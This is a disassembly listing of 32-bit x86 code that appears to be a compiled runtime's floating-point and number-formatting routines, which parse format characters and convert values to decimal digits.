  405d9f:	aa                   	stos   %al,%es:(%edi)
  405da0:	eb f8                	jmp    0x405d9a
  405da2:	b0 30                	mov    $0x30,%al
  405da4:	f3 aa                	rep stos %al,%es:(%edi)
  405da6:	0b d2                	or     %edx,%edx
  405da8:	74 06                	je     0x405db0
  405daa:	33 c0                	xor    %eax,%eax
  405dac:	33 c9                	xor    %ecx,%ecx
  405dae:	eb 2b                	jmp    0x405ddb
  405db0:	c3                   	ret
  405db1:	e8 8f ff ff ff       	call   0x405d45
  405db6:	e8 81 ff ff ff       	call   0x405d3c
  405dbb:	8a 25 9b b4 40 00    	mov    0x40b49b,%ah
  405dc1:	66 ab                	stos   %ax,%es:(%edi)
  405dc3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405dc6:	49                   	dec    %ecx
  405dc7:	e8 70 ff ff ff       	call   0x405d3c
  405dcc:	aa                   	stos   %al,%es:(%edi)
  405dcd:	e2 f8                	loop   0x405dc7
  405dcf:	b4 2b                	mov    $0x2b,%ah
  405dd1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405dd4:	83 f9 04             	cmp    $0x4,%ecx
  405dd7:	72 02                	jb     0x405ddb
  405dd9:	33 c9                	xor    %ecx,%ecx
  405ddb:	b0 45                	mov    $0x45,%al
  405ddd:	8a 5d e7             	mov    -0x19(%ebp),%bl
  405de0:	0f bf 55 e4          	movswl -0x1c(%ebp),%edx
  405de4:	4a                   	dec    %edx
  405de5:	aa                   	stos   %al,%es:(%edi)
  405de6:	0a db                	or     %bl,%bl
  405de8:	75 04                	jne    0x405dee
  405dea:	33 d2                	xor    %edx,%edx
  405dec:	eb 0a                	jmp    0x405df8
  405dee:	0b d2                	or     %edx,%edx
  405df0:	7d 06                	jge    0x405df8
  405df2:	b0 2d                	mov    $0x2d,%al
  405df4:	f7 da                	neg    %edx
  405df6:	eb 06                	jmp    0x405dfe
  405df8:	0a e4                	or     %ah,%ah
  405dfa:	74 03                	je     0x405dff
  405dfc:	8a c4                	mov    %ah,%al
  405dfe:	aa                   	stos   %al,%es:(%edi)
  405dff:	92                   	xchg   %eax,%edx
  405e00:	50                   	push   %eax
  405e01:	8b dc                	mov    %esp,%ebx
  405e03:	33 d2                	xor    %edx,%edx
  405e05:	f7 35 6c 5c 40 00    	divl   0x405c6c
  405e0b:	80 c2 30             	add    $0x30,%dl
  405e0e:	88 13                	mov    %dl,(%ebx)
  405e10:	43                   	inc    %ebx
  405e11:	49                   	dec    %ecx
  405e12:	0b c0                	or     %eax,%eax
  405e14:	75 ed                	jne    0x405e03
  405e16:	0b c9                	or     %ecx,%ecx
  405e18:	7f e9                	jg     0x405e03
  405e1a:	4b                   	dec    %ebx
  405e1b:	8a 03                	mov    (%ebx),%al
  405e1d:	aa                   	stos   %al,%es:(%edi)
  405e1e:	3b dc                	cmp    %esp,%ebx
  405e20:	75 f8                	jne    0x405e1a
  405e22:	58                   	pop    %eax
  405e23:	c3                   	ret
  405e24:	e8 1c ff ff ff       	call   0x405d45
  405e29:	8b 55 08             	mov    0x8(%ebp),%edx
  405e2c:	83 fa 12             	cmp    $0x12,%edx
  405e2f:	72 05                	jb     0x405e36
  405e31:	ba 12 00 00 00       	mov    $0x12,%edx
  405e36:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  405e3a:	0b c9                	or     %ecx,%ecx
  405e3c:	7f 05                	jg     0x405e43
  405e3e:	b0 30                	mov    $0x30,%al
  405e40:	aa                   	stos   %al,%es:(%edi)
  405e41:	eb 28                	jmp    0x405e6b
  405e43:	33 db                	xor    %ebx,%ebx
  405e45:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  405e49:	74 0a                	je     0x405e55
  405e4b:	8b c1                	mov    %ecx,%eax
  405e4d:	48                   	dec    %eax
  405e4e:	b3 03                	mov    $0x3,%bl
  405e50:	f6 f3                	div    %bl
  405e52:	8a dc                	mov    %ah,%bl
  405e54:	43                   	inc    %ebx
  405e55:	e8 e2 fe ff ff       	call   0x405d3c
  405e5a:	aa                   	stos   %al,%es:(%edi)
  405e5b:	49                   	dec    %ecx
  405e5c:	74 0d                	je     0x405e6b
  405e5e:	4b                   	dec    %ebx
  405e5f:	75 f4                	jne    0x405e55
  405e61:	a0 9a b4 40 00       	mov    0x40b49a,%al
  405e66:	aa                   	stos   %al,%es:(%edi)
  405e67:	b3 03                	mov    $0x3,%bl
  405e69:	eb ea                	jmp    0x405e55
  405e6b:	0b d2                	or     %edx,%edx
  405e6d:	74 1a                	je     0x405e89
  405e6f:	a0 9b b4 40 00       	mov    0x40b49b,%al
  405e74:	aa                   	stos   %al,%es:(%edi)
  405e75:	e3 09                	jecxz  0x405e80
  405e77:	b0 30                	mov    $0x30,%al
  405e79:	aa                   	stos   %al,%es:(%edi)
  405e7a:	4a                   	dec    %edx
  405e7b:	74 0c                	je     0x405e89
  405e7d:	41                   	inc    %ecx
  405e7e:	75 f9                	jne    0x405e79
  405e80:	e8 b7 fe ff ff       	call   0x405d3c
  405e85:	aa                   	stos   %al,%es:(%edi)
  405e86:	4a                   	dec    %edx
  405e87:	75 f7                	jne    0x405e80
  405e89:	c3                   	ret
  405e8a:	33 db                	xor    %ebx,%ebx
  405e8c:	8a 1d 98 b4 40 00    	mov    0x40b498,%bl
  405e92:	b9 03 00 00 00       	mov    $0x3,%ecx
  405e97:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  405e9b:	74 0b                	je     0x405ea8
  405e9d:	8a 1d 99 b4 40 00    	mov    0x40b499,%bl
  405ea3:	b9 0f 04 00 00       	mov    $0x40f,%ecx
  405ea8:	3a d9                	cmp    %cl,%bl
  405eaa:	76 02                	jbe    0x405eae
  405eac:	8a d9                	mov    %cl,%bl
  405eae:	02 dd                	add    %ch,%bl
  405eb0:	8d 9c 9b f3 5e 40 00 	lea    0x405ef3(%ebx,%ebx,4),%ebx
  405eb7:	b9 05 00 00 00       	mov    $0x5,%ecx
  405ebc:	8a 03                	mov    (%ebx),%al
  405ebe:	3c 40                	cmp    $0x40,%al
  405ec0:	74 1e                	je     0x405ee0
  405ec2:	51                   	push   %ecx
  405ec3:	53                   	push   %ebx
  405ec4:	3c 24                	cmp    $0x24,%al
  405ec6:	74 07                	je     0x405ecf
  405ec8:	3c 2a                	cmp    $0x2a,%al
  405eca:	74 0a                	je     0x405ed6
  405ecc:	aa                   	stos   %al,%es:(%edi)
  405ecd:	eb 0c                	jmp    0x405edb
  405ecf:	e8 0d 00 00 00       	call   0x405ee1
  405ed4:	eb 05                	jmp    0x405edb
  405ed6:	e8 4e ff ff ff       	call   0x405e29
  405edb:	5b                   	pop    %ebx
  405edc:	59                   	pop    %ecx
  405edd:	43                   	inc    %ebx
  405ede:	e2 dc                	loop   0x405ebc
  405ee0:	c3                   	ret
  405ee1:	56                   	push   %esi
  405ee2:	8b 35 94 b4 40 00    	mov    0x40b494,%esi
  405ee8:	85 f6                	test   %esi,%esi
  405eea:	74 05                	je     0x405ef1
  405eec:	8b 4e fc             	mov    -0x4(%esi),%ecx
  405eef:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405ef1:	5e                   	pop    %esi
  405ef2:	c3                   	ret
  405ef3:	24 2a                	and    $0x2a,%al
  405ef5:	40                   	inc    %eax
  405ef6:	40                   	inc    %eax
  405ef7:	40                   	inc    %eax
  405ef8:	2a 24 40             	sub    (%eax,%eax,2),%ah
  405efb:	40                   	inc    %eax
  405efc:	40                   	inc    %eax
  405efd:	24 20                	and    $0x20,%al
  405eff:	2a 40 40             	sub    0x40(%eax),%al
  405f02:	2a 20                	sub    (%eax),%ah
  405f04:	24 40                	and    $0x40,%al
  405f06:	40                   	inc    %eax
  405f07:	28 24 2a             	sub    %ah,(%edx,%ebp,1)
  405f0a:	29 40 2d             	sub    %eax,0x2d(%eax)
  405f0d:	24 2a                	and    $0x2a,%al
  405f0f:	40                   	inc    %eax
  405f10:	40                   	inc    %eax
  405f11:	24 2d                	and    $0x2d,%al
  405f13:	2a 40 40             	sub    0x40(%eax),%al
  405f16:	24 2a                	and    $0x2a,%al
  405f18:	2d 40 40 28 2a       	sub    $0x2a284040,%eax
  405f1d:	24 29                	and    $0x29,%al
  405f1f:	40                   	inc    %eax
  405f20:	2d 2a 24 40 40       	sub    $0x4040242a,%eax
  405f25:	2a 2d 24 40 40 2a    	sub    0x2a404024,%ch
  405f2b:	24 2d                	and    $0x2d,%al
  405f2d:	40                   	inc    %eax
  405f2e:	40                   	inc    %eax
  405f2f:	2d 2a 20 24 40       	sub    $0x4024202a,%eax
  405f34:	2d 24 20 2a 40       	sub    $0x402a2024,%eax
  405f39:	2a 20                	sub    (%eax),%ah
  405f3b:	24 2d                	and    $0x2d,%al
  405f3d:	40                   	inc    %eax
  405f3e:	24 20                	and    $0x20,%al
  405f40:	2a 2d 40 24 20 2d    	sub    0x2d202440,%ch
  405f46:	2a 40 2a             	sub    0x2a(%eax),%al
  405f49:	2d 20 24 40 28       	sub    $0x28402420,%eax
  405f4e:	24 20                	and    $0x20,%al
  405f50:	2a 29                	sub    (%ecx),%ch
  405f52:	28 2a                	sub    %ch,(%edx)
  405f54:	20 24 29             	and    %ah,(%ecx,%ebp,1)
  405f57:	55                   	push   %ebp
  405f58:	8b ec                	mov    %esp,%ebp
  405f5a:	83 ec 40             	sub    $0x40,%esp
  405f5d:	57                   	push   %edi
  405f5e:	56                   	push   %esi
  405f5f:	53                   	push   %ebx
  405f60:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405f63:	8b fa                	mov    %edx,%edi
  405f65:	8b d9                	mov    %ecx,%ebx
  405f67:	b9 02 00 00 00       	mov    $0x2,%ecx
  405f6c:	80 fb 00             	cmp    $0x0,%bl
  405f6f:	74 0f                	je     0x405f80
  405f71:	8b 07                	mov    (%edi),%eax
  405f73:	0b 47 04             	or     0x4(%edi),%eax
  405f76:	74 1a                	je     0x405f92
  405f78:	8b 4f 04             	mov    0x4(%edi),%ecx
  405f7b:	c1 e9 1f             	shr    $0x1f,%ecx
  405f7e:	eb 12                	jmp    0x405f92
  405f80:	0f b7 47 08          	movzwl 0x8(%edi),%eax
  405f84:	0b 07                	or     (%edi),%eax
  405f86:	0b 47 04             	or     0x4(%edi),%eax
  405f89:	74 07                	je     0x405f92
  405f8b:	0f b7 4f 08          	movzwl 0x8(%edi),%ecx
  405f8f:	c1 e9 0f             	shr    $0xf,%ecx
  405f92:	e8 8c 00 00 00       	call   0x406023
  405f97:	74 4c                	je     0x405fe5
  405f99:	e8 c0 00 00 00       	call   0x40605e
  405f9e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405fa1:	ba 0f 27 00 00       	mov    $0x270f,%edx
  405fa6:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  405faa:	75 0a                	jne    0x405fb6
  405fac:	2b 45 e8             	sub    -0x18(%ebp),%eax
  405faf:	8b d0                	mov    %eax,%edx
  405fb1:	b8 12 00 00 00       	mov    $0x12,%eax
  405fb6:	50                   	push   %eax
  405fb7:	52                   	push   %edx
  405fb8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405fbb:	8b d7                	mov    %edi,%edx
  405fbd:	8b cb                	mov    %ebx,%ecx
  405fbf:	e8 66 02 00 00       	call   0x40622a
  405fc4:	66 8b 45 c0          	mov    -0x40(%ebp),%ax
  405fc8:	66 3d 00 80          	cmp    $0x8000,%ax
  405fcc:	74 17                	je     0x405fe5
  405fce:	66 3d ff 7f          	cmp    $0x7fff,%ax
  405fd2:	74 11                	je     0x405fe5
  405fd4:	80 fb 00             	cmp    $0x0,%bl
  405fd7:	75 20                	jne    0x405ff9
  405fd9:	66 3d 12 00          	cmp    $0x12,%ax
  405fdd:	7e 1a                	jle    0x405ff9
  405fdf:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  405fe3:	75 14                	jne    0x405ff9
  405fe5:	6a 00                	push   $0x0
  405fe7:	6a 0f                	push   $0xf
  405fe9:	6a 00                	push   $0x0
  405feb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fee:	8b d7                	mov    %edi,%edx
  405ff0:	8b cb                	mov    %ebx,%ecx
  405ff2:	e8 97 fc ff ff       	call   0x405c8e
  405ff7:	eb 21                	jmp    0x40601a
  405ff9:	80 7d c3 00          	cmpb   $0x0,-0x3d(%ebp)
  405ffd:	75 16                	jne    0x406015
  405fff:	b9 02 00 00 00       	mov    $0x2,%ecx
  406004:	e8 1a 00 00 00       	call   0x406023
  406009:	74 da                	je     0x405fe5
  40600b:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  40600e:	74 05                	je     0x406015
  406010:	e8 49 00 00 00       	call   0x40605e
  406015:	e8 ef 00 00 00       	call   0x406109
  40601a:	5b                   	pop    %ebx
  40601b:	5e                   	pop    %esi
  40601c:	5f                   	pop    %edi
  40601d:	8b e5                	mov    %ebp,%esp
  40601f:	5d                   	pop    %ebp
  406020:	c2 04 00             	ret    $0x4
  406023:	8b 75 08             	mov    0x8(%ebp),%esi
  406026:	e3 1d                	jecxz  0x406045
  406028:	ac                   	lods   %ds:(%esi),%al
  406029:	3c 27                	cmp    $0x27,%al
  40602b:	74 24                	je     0x406051
  40602d:	3c 22                	cmp    $0x22,%al
  40602f:	74 20                	je     0x406051
  406031:	0a c0                	or     %al,%al
  406033:	74 10                	je     0x406045
  406035:	3c 3b                	cmp    $0x3b,%al
  406037:	75 ef                	jne    0x406028
  406039:	e2 ed                	loop   0x406028
  40603b:	8a 06                	mov    (%esi),%al
  40603d:	0a c0                	or     %al,%al
  40603f:	74 04                	je     0x406045
  406041:	3c 3b                	cmp    $0x3b,%al
  406043:	75 0b                	jne    0x406050
  406045:	8b 75 08             	mov    0x8(%ebp),%esi
  406048:	8a 06                	mov    (%esi),%al
  40604a:	0a c0                	or     %al,%al
  40604c:	74 02                	je     0x406050
  40604e:	3c 3b                	cmp    $0x3b,%al
  406050:	c3                   	ret
  406051:	8a e0                	mov    %al,%ah
  406053:	ac                   	lods   %ds:(%esi),%al
  406054:	3a c4                	cmp    %ah,%al
  406056:	74 d0                	je     0x406028
  406058:	0a c0                	or     %al,%al
  40605a:	75 f7                	jne    0x406053
  40605c:	eb e7                	jmp    0x406045
  40605e:	53                   	push   %ebx
  40605f:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406062:	bb ff 7f 00 00       	mov    $0x7fff,%ebx
  406067:	33 c9                	xor    %ecx,%ecx
  406069:	33 d2                	xor    %edx,%edx
  40606b:	c7 45 e8 ff ff ff ff 	movl   $0xffffffff,-0x18(%ebp)
  406072:	88 55 f8             	mov    %dl,-0x8(%ebp)
  406075:	88 55 f4             	mov    %dl,-0xc(%ebp)
  406078:	ac                   	lods   %ds:(%esi),%al
  406079:	3c 23                	cmp    $0x23,%al
  40607b:	74 26                	je     0x4060a3
  40607d:	3c 30                	cmp    $0x30,%al
  40607f:	74 25                	je     0x4060a6
  406081:	3c 2e                	cmp    $0x2e,%al
  406083:	74 2c                	je     0x4060b1
  406085:	3c 2c                	cmp    $0x2c,%al
  406087:	74 33                	je     0x4060bc
  406089:	3c 27                	cmp    $0x27,%al
  40608b:	74 35                	je     0x4060c2
  40608d:	3c 22                	cmp    $0x22,%al
  40608f:	74 31                	je     0x4060c2
  406091:	3c 45                	cmp    $0x45,%al
  406093:	74 3a                	je     0x4060cf
  406095:	3c 65                	cmp    $0x65,%al
  406097:	74 36                	je     0x4060cf
  406099:	3c 3b                	cmp    $0x3b,%al
  40609b:	74 46                	je     0x4060e3
  40609d:	0a c0                	or     %al,%al
  40609f:	75 d7                	jne    0x406078
  4060a1:	eb 40                	jmp    0x4060e3
  4060a3:	42                   	inc    %edx
  4060a4:	eb d2                	jmp    0x406078
  4060a6:	3b d3                	cmp    %ebx,%edx
  4060a8:	7d 02                	jge    0x4060ac
  4060aa:	8b da                	mov    %edx,%ebx
  4060ac:	42                   	inc    %edx
  4060ad:	8b ca                	mov    %edx,%ecx
  4060af:	eb c7                	jmp    0x406078
  4060b1:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4060b5:	75 c1                	jne    0x406078
  4060b7:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4060ba:	eb bc                	jmp    0x406078
  4060bc:	c6 45 f8 01          	movb   $0x1,-0x8(%ebp)
  4060c0:	eb b6                	jmp    0x406078
  4060c2:	8a e0                	mov    %al,%ah
  4060c4:	ac                   	lods   %ds:(%esi),%al
  4060c5:	3a c4                	cmp    %ah,%al
  4060c7:	74 af                	je     0x406078
  4060c9:	0a c0                	or     %al,%al
  4060cb:	75 f7                	jne    0x4060c4
  4060cd:	eb 14                	jmp    0x4060e3
  4060cf:	ac                   	lods   %ds:(%esi),%al
  4060d0:	3c 2d                	cmp    $0x2d,%al
  4060d2:	74 04                	je     0x4060d8
  4060d4:	3c 2b                	cmp    $0x2b,%al
  4060d6:	75 a1                	jne    0x406079
  4060d8:	c6 45 f4 01          	movb   $0x1,-0xc(%ebp)
  4060dc:	ac                   	lods   %ds:(%esi),%al
  4060dd:	3c 30                	cmp    $0x30,%al
  4060df:	74 fb                	je     0x4060dc
  4060e1:	eb 96                	jmp    0x406079
  4060e3:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4060e6:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4060ea:	75 03                	jne    0x4060ef
  4060ec:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4060ef:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4060f2:	2b c1                	sub    %ecx,%eax
  4060f4:	7e 02                	jle    0x4060f8
  4060f6:	33 c0                	xor    %eax,%eax
  4060f8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4060fb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4060fe:	2b c3                	sub    %ebx,%eax
  406100:	7d 02                	jge    0x406104
  406102:	33 c0                	xor    %eax,%eax
  406104:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406107:	5b                   	pop    %ebx
  406108:	c3                   	ret
  406109:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  40610d:	74 07                	je     0x406116
  40610f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406112:	33 d2                	xor    %edx,%edx
  406114:	eb 13                	jmp    0x406129
  406116:	0f bf 45 c0          	movswl -0x40(%ebp),%eax
  40611a:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  40611d:	7f 03                	jg     0x406122
  40611f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406122:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  406126:	2b 55 e8             	sub    -0x18(%ebp),%edx
  406129:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40612c:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40612f:	8b 75 f0             	mov    -0x10(%ebp),%esi
  406132:	8b 7d fc             	mov    -0x4(%ebp),%edi
  406135:	8d 5d c3             	lea    -0x3d(%ebp),%ebx
  406138:	80 7d c2 00          	cmpb   $0x0,-0x3e(%ebp)
  40613c:	74 08                	je     0x406146
  40613e:	3b 75 08             	cmp    0x8(%ebp),%esi
  406141:	75 03                	jne    0x406146
  406143:	b0 2d                	mov    $0x2d,%al
  406145:	aa                   	stos   %al,%es:(%edi)
  406146:	ac                   	lods   %ds:(%esi),%al
  406147:	3c 23                	cmp    $0x23,%al
  406149:	74 27                	je     0x406172
  40614b:	3c 30                	cmp    $0x30,%al
  40614d:	74 23                	je     0x406172
  40614f:	3c 2e                	cmp    $0x2e,%al
  406151:	74 f3                	je     0x406146
  406153:	3c 2c                	cmp    $0x2c,%al
  406155:	74 ef                	je     0x406146
  406157:	3c 27                	cmp    $0x27,%al
  406159:	74 1e                	je     0x406179
  40615b:	3c 22                	cmp    $0x22,%al
  40615d:	74 1a                	je     0x406179
  40615f:	3c 45                	cmp    $0x45,%al
  406161:	74 24                	je     0x406187
  406163:	3c 65                	cmp    $0x65,%al
  406165:	74 20                	je     0x406187
  406167:	3c 3b                	cmp    $0x3b,%al
  406169:	74 53                	je     0x4061be
  40616b:	0a c0                	or     %al,%al
  40616d:	74 4f                	je     0x4061be
  40616f:	aa                   	stos   %al,%es:(%edi)
  406170:	eb d4                	jmp    0x406146
  406172:	e8 4d 00 00 00       	call   0x4061c4
  406177:	eb cd                	jmp    0x406146
  406179:	8a e0                	mov    %al,%ah
  40617b:	ac                   	lods   %ds:(%esi),%al
  40617c:	3a c4                	cmp    %ah,%al
  40617e:	74 c6                	je     0x406146
  406180:	0a c0                	or     %al,%al
  406182:	74 3a                	je     0x4061be
  406184:	aa                   	stos   %al,%es:(%edi)
  406185:	eb f4                	jmp    0x40617b
  406187:	8a 26                	mov    (%esi),%ah
  406189:	80 fc 2b             	cmp    $0x2b,%ah
  40618c:	74 07                	je     0x406195
  40618e:	80 fc 2d             	cmp    $0x2d,%ah
  406191:	75 dc                	jne    0x40616f
  406193:	32 e4                	xor    %ah,%ah
  406195:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40619a:	41                   	inc    %ecx
  40619b:	46                   	inc    %esi
  40619c:	80 3e 30             	cmpb   $0x30,(%esi)
  40619f:	74 f9                	je     0x40619a
  4061a1:	83 f9 04             	cmp    $0x4,%ecx
  4061a4:	72 05                	jb     0x4061ab
  4061a6:	b9 04 00 00 00       	mov    $0x4,%ecx
  4061ab:	53                   	push   %ebx
  4061ac:	8a 5d c3             	mov    -0x3d(%ebp),%bl
  4061af:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  4061b3:	2b 55 e8             	sub    -0x18(%ebp),%edx
  4061b6:	e8 2a fc ff ff       	call   0x405de5
  4061bb:	5b                   	pop    %ebx
  4061bc:	eb 88                	jmp    0x406146
  4061be:	8b c7                	mov    %edi,%eax
  4061c0:	2b 45 fc             	sub    -0x4(%ebp),%eax
  4061c3:	c3                   	ret
  4061c4:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4061c8:	74 1b                	je     0x4061e5
  4061ca:	7c 0c                	jl     0x4061d8
  4061cc:	e8 14 00 00 00       	call   0x4061e5
  4061d1:	ff 4d d8             	decl   -0x28(%ebp)
  4061d4:	75 f6                	jne    0x4061cc
  4061d6:	eb 0d                	jmp    0x4061e5
  4061d8:	ff 45 d8             	incl   -0x28(%ebp)
  4061db:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4061de:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  4061e1:	7e 12                	jle    0x4061f5
  4061e3:	eb 41                	jmp    0x406226
  4061e5:	8a 03                	mov    (%ebx),%al
  4061e7:	43                   	inc    %ebx
  4061e8:	0a c0                	or     %al,%al
  4061ea:	75 0b                	jne    0x4061f7
  4061ec:	4b                   	dec    %ebx
  4061ed:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4061f0:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  4061f3:	7e 31                	jle    0x406226
  4061f5:	b0 30                	mov    $0x30,%al
  4061f7:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  4061fb:	75 0b                	jne    0x406208
  4061fd:	8a e0                	mov    %al,%ah
  4061ff:	a0 9b b4 40 00       	mov    0x40b49b,%al
  406204:	66 ab                	stos   %ax,%es:(%edi)
  406206:	eb 1e                	jmp    0x406226
  406208:	aa                   	stos   %al,%es:(%edi)
  406209:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  40620d:	74 17                	je     0x406226
  40620f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406212:	83 f8 01             	cmp    $0x1,%eax
  406215:	7e 0f                	jle    0x406226
  406217:	b2 03                	mov    $0x3,%dl
  406219:	f6 f2                	div    %dl
  40621b:	80 fc 01             	cmp    $0x1,%ah
  40621e:	75 06                	jne    0x406226
  406220:	a0 9a b4 40 00       	mov    0x40b49a,%al
  406225:	aa                   	stos   %al,%es:(%edi)
  406226:	ff 4d dc             	decl   -0x24(%ebp)
  406229:	c3                   	ret
  40622a:	55                   	push   %ebp
  40622b:	8b ec                	mov    %esp,%ebp
  40622d:	83 ec 1a             	sub    $0x1a,%esp
  406230:	57                   	push   %edi
  406231:	56                   	push   %esi
  406232:	53                   	push   %ebx
  406233:	8b d8                	mov    %eax,%ebx
  406235:	8b f2                	mov    %edx,%esi
  406237:	80 f9 00             	cmp    $0x0,%cl
  40623a:	74 07                	je     0x406243
  40623c:	e8 05 01 00 00       	call   0x406346
  406241:	eb 05                	jmp    0x406248
  406243:	e8 09 00 00 00       	call   0x406251
  406248:	5b                   	pop    %ebx
  406249:	5e                   	pop    %esi
  40624a:	5f                   	pop    %edi
  40624b:	8b e5                	mov    %ebp,%esp
  40624d:	5d                   	pop    %ebp
  40624e:	c2 08 00             	ret    $0x8
  406251:	66 8b 46 08          	mov    0x8(%esi),%ax
  406255:	8b d0                	mov    %eax,%edx
  406257:	25 ff 7f 00 00       	and    $0x7fff,%eax
  40625c:	74 10                	je     0x40626e
  40625e:	3d ff 7f 00 00       	cmp    $0x7fff,%eax
  406263:	75 14                	jne    0x406279
  406265:	66 81 7e 06 00 80    	cmpw   $0x8000,0x6(%esi)
  40626b:	74 03                	je     0x406270
  40626d:	40                   	inc    %eax
  40626e:	33 d2                	xor    %edx,%edx
  406270:	c6 43 03 00          	movb   $0x0,0x3(%ebx)
  406274:	e9 c2 00 00 00       	jmp    0x40633b
  406279:	db 2e                	fldt   (%esi)
  40627b:	2d ff 3f 00 00       	sub    $0x3fff,%eax
  406280:	69 c0 10 4d 00 00    	imul   $0x4d10,%eax,%eax
  406286:	c1 f8 10             	sar    $0x10,%eax
  406289:	40                   	inc    %eax
  40628a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40628d:	b8 12 00 00 00       	mov    $0x12,%eax
  406292:	2b 45 f8             	sub    -0x8(%ebp),%eax
  406295:	d9 e1                	fabs
  406297:	e8 78 dd ff ff       	call   0x404014
  40629c:	d9 fc                	frndint
  40629e:	db 2d 7c 5c 40 00    	fldt   0x405c7c
  4062a4:	d8 d9                	fcomp  %st(1)
  4062a6:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  4062aa:	9b                   	fwait
  4062ab:	66 f7 45 fc 00 41    	testw  $0x4100,-0x4(%ebp)
  4062b1:	74 09                	je     0x4062bc
  4062b3:	da 35 6c 5c 40 00    	fidivl 0x405c6c
  4062b9:	ff 45 f8             	incl   -0x8(%ebp)
  4062bc:	df 75 e6             	fbstp  -0x1a(%ebp)
  4062bf:	8d 7b 03             	lea    0x3(%ebx),%edi
  4062c2:	ba 09 00 00 00       	mov    $0x9,%edx
  4062c7:	9b                   	fwait
  4062c8:	8a 44 15 e5          	mov    -0x1b(%ebp,%edx,1),%al
  4062cc:	8a e0                	mov    %al,%ah
  4062ce:	c0 e8 04             	shr    $0x4,%al
  4062d1:	80 e4 0f             	and    $0xf,%ah
  4062d4:	66 05 30 30          	add    $0x3030,%ax
  4062d8:	66 ab                	stos   %ax,%es:(%edi)
  4062da:	4a                   	dec    %edx
  4062db:	75 eb                	jne    0x4062c8
  4062dd:	32 c0                	xor    %al,%al
  4062df:	aa                   	stos   %al,%es:(%edi)
  4062e0:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4062e3:	03 7d 08             	add    0x8(%ebp),%edi
  4062e6:	79 04                	jns    0x4062ec
  4062e8:	33 c0                	xor    %eax,%eax
  4062ea:	eb 82                	jmp    0x40626e
  4062ec:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4062ef:	72 03                	jb     0x4062f4
  4062f1:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4062f4:	83 ff 12             	cmp    $0x12,%edi
  4062f7:	73 27                	jae    0x406320
  4062f9:	80 7c 3b 03 35       	cmpb   $0x35,0x3(%ebx,%edi,1)
  4062fe:	72 25                	jb     0x406325
  406300:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  406305:	4f                   	dec    %edi
  406306:	78 0d                	js     0x406315
  406308:	fe 44 3b 03          	incb   0x3(%ebx,%edi,1)
  40630c:	80 7c 3b 03 39       	cmpb   $0x39,0x3(%ebx,%edi,1)
  406311:	77 ed                	ja     0x406300
  406313:	eb 1f                	jmp    0x406334
  406315:	66 c7 43 03 31 00    	movw   $0x31,0x3(%ebx)
  40631b:	ff 45 f8             	incl   -0x8(%ebp)
  40631e:	eb 14                	jmp    0x406334
  406320:	bf 12 00 00 00       	mov    $0x12,%edi
  406325:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  40632a:	4f                   	dec    %edi
  40632b:	78 07                	js     0x406334
  40632d:	80 7c 3b 03 30       	cmpb   $0x30,0x3(%ebx,%edi,1)
  406332:	74 f1                	je     0x406325
  406334:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406337:	66 8b 56 08          	mov    0x8(%esi),%dx
  40633b:	66 c1 ea 0f          	shr    $0xf,%dx
  40633f:	66 89 03             	mov    %ax,(%ebx)
  406342:	88 53 02             	mov    %dl,0x2(%ebx)
  406345:	c3                   	ret
  406346:	8b 06                	mov    (%esi),%eax
  406348:	8b 56 04             	mov    0x4(%esi),%edx
  40634b:	8b c8                	mov    %eax,%ecx
  40634d:	0b ca                	or     %edx,%ecx
  40634f:	0f 84 b4 00 00 00    	je     0x406409
  406355:	0b d2                	or     %edx,%edx
  406357:	79 07                	jns    0x406360
  406359:	f7 da                	neg    %edx
  40635b:	f7 d8                	neg    %eax
  40635d:	83 da 00             	sbb    $0x0,%edx
  406360:	33 c9                	xor    %ecx,%ecx
  406362:	8b 7d 08             	mov    0x8(%ebp),%edi
  406365:	0b ff                	or     %edi,%edi
  406367:	7d 02                	jge    0x40636b
  406369:	33 ff                	xor    %edi,%edi
  40636b:	83 ff 04             	cmp    $0x4,%edi
